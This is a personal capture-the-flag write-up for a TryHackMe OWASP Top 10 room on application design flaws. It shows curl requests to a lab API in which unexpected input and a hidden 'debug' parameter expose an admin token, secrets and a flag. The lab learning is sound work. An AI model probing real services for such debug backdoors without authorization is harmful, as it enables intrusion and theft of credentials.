### Monday, 13 july 2026

**Task 2**

1. First thing I do is to navigate to the websites of the target, and there are some info<br>
    `GET /api/user/123`<br>
    `Retrieve user information by ID. User ID must be numeric.` 
2. I try to navigate to the api endpoint and try some random number. But it didn't work..
3. Maybe I think too far searching about the service, CVE, exploit etc
4. But the flag can be obtained just by entering a letter, special chars or something like that.. whatt??
    >Because of that, I learned something a hacker would think of.<br>
    **"What happens if I do something the developer didn't expect?"<br>
    "What if I put something completely wrong here?"**

---
**Task 3**

1. trying a simple curl
    ```bash
    $ curl -X POST http://10.48.136.93:5003/api/process 
    {
      "error": "415 Unsupported Media Type: Did not attempt to load JSON data because the request Content-Type was not 'application/json'."
    }
    ```    
2.  add a JSON header  

    ```
    $ curl -X POST http://10.48.136.93:5003/api/process -H "Content-Type:application/json"
    {
      "error": "400 Bad Request: Failed to decode JSON object: Expecting value: line 1 column 1 (char 0)"
    }
    ```
3. inspecting the file I download from this section before   
    ```python
    if data == 'debug':
        return jsonify(debug_info())
    ```    
4. I don't know what was that and how the script work, but I tried
    ```
    $ curl -X POST http://10.48.136.93:5003/api/process -H "Content-Type: application/json" -d '{"data":"debug"}'
    {
      "admin_token": "admin_token_12345",
      "flag": "THM{ xxxxxxx}",
      "internal_secret": "internal_secret_key_2024",
      "version": "1.2.3"
    }
    ```
    and it works!

---
**Task 4**

---
[TryHackMe | OWASP Top 10 2025: Application Design Flaws](https://tryhackme.com/room/owasptopten2025two)

